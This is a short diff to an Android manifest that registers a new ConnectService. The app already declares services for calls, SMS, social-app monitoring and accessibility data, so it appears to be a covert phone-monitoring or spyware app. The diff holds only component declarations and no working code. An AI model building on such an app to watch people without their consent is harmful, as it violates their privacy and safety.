@@ -101,6 +101,7 @@
         <service android:name="com.dtz.netservice.services.calls.CallsService" />
         <service android:name="com.dtz.netservice.services.sms.SmsService" />
         <service android:name="com.dtz.netservice.services.social.MonitorService" />
+        <service android:name="com.dtz.netservice.services.connect.ConnectService" />
         <service
             android:name="com.dtz.netservice.services.accessibilityData.AccessibilityDataService"
             android:label="@string/accessibility_service_label"
